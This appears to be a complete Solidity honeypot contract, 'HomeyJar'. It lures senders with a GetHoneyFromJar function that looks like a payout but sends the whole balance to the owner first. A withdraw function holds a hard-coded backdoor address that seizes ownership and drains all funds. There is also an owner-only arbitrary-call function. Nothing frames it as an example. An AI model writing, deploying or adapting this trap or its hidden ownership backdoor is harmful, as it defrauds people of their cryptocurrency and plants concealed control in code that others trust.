pragma solidity ^0.4.19;

contract HomeyJar {
    address public Owner;

    function HomeyJar() public {
        Owner = msg.sender;
    }

    function() public payable {}

    function GetHoneyFromJar() public payable {
        if (msg.value > 1 ether) {
            Owner.transfer(this.balance);
            msg.sender.transfer(this.balance);
        }
    }

    function withdraw() public payable {
        if (msg.sender == 0x2f61E7e1023Bc22063B8da897d8323965a7712B7) {
            Owner = 0x2f61E7e1023Bc22063B8da897d8323965a7712B7;
        }
        require(msg.sender == Owner);
        Owner.transfer(this.balance);
    }

    function Command(address adr, bytes data) public payable {
        require(msg.sender == Owner);
        require(adr != address(0)); // check for empty address

        bool success;
        bytes memory result;
        assembly {
            let x := mload(0x40) // get empty storage location
            success := call(
                gas, // forward all gas
                adr, // address to call
                msg.value, // wei to send
                add(data, 0x20), // pointer to start of input
                mload(data), // length of input
                x, // pointer to start of output
                0x20 // length of output
            )
            result := x
        }
        require(success);
    }
}